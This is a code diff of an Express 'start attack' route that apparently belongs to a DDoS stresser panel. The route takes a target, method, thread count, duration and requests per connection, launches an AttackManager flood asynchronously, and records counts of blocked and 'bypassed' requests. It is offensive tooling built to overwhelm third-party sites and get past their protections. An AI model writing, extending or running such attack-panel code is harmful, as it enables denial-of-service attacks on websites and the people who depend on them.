@@ -121,48 +121,46 @@ router.post('/start',
                 userAgent: req.headers['user-agent']
             });
 
-            // Start attack
-            const attackManager = new AttackManager({
-                target,
-                method,
-                threads: parseInt(threads),
-                duration: parseInt(duration),
-                rpc: parseInt(rpc),
-                proxies: null,
-                userAgents: [],
-                referers: [],
-                enableMonitoring: false
-            });
-
-            // Store active attack
-            activeAttacks.set(user.id, {
-                manager: attackManager,
-                attackId: attackRecord.id
-            });
-
             // Start statistics tracking
             globalStats.reset();
             globalStats.start();
 
-            // Start attack
-            attackManager.start().then(async () => {
-                // Attack completed
-                const stats = globalStats.getStats();
-                
-                await Attack.updateStatus(attackRecord.id, 'completed', {
-                    totalRequests: stats.totalRequests,
-                    successfulRequests: stats.successfulRequests,
-                    blockedRequests: stats.blockedRequests,
-                    bypassedRequests: stats.bypassedRequests
+            // Start attack in separate process to avoid blocking web server
+            setImmediate(() => {
+                const attackManager = new AttackManager({
+                    target,
+                    method,
+                    threads: parseInt(threads),
+                    duration: parseInt(duration),
+                    rpc: parseInt(rpc),
+                    proxies: null,
+                    userAgents: null,
+                    referers: null,
+                    enableMonitoring: true
                 });
+                
+                activeAttacks.set(req.user.id, attackManager);
+                
+                // Start attack (non-blocking)
+                attackManager.start().then(async () => {
+                    // Attack completed
+                    const stats = globalStats.getStats();
+                    
+                    await Attack.updateStatus(attackRecord.id, 'completed', {
+                        totalRequests: stats.totalRequests,
+                        successfulRequests: stats.successfulRequests,
+                        blockedRequests: stats.blockedRequests,
+                        bypassedRequests: stats.bypassedRequests
+                    });
 
-                globalStats.stop();
-                activeAttacks.delete(user.id);
-            }).catch(async (err) => {
-                console.error('Attack error:', err);
-                await Attack.updateStatus(attackRecord.id, 'failed');
-                globalStats.stop();
-                activeAttacks.delete(user.id);
+                    globalStats.stop();
+                    activeAttacks.delete(user.id);
+                }).catch(async (err) => {
+                    console.error('Attack error:', err);
+                    await Attack.updateStatus(attackRecord.id, 'failed');
+                    globalStats.stop();
+                    activeAttacks.delete(user.id);
+                });
             });
 
             res.json({
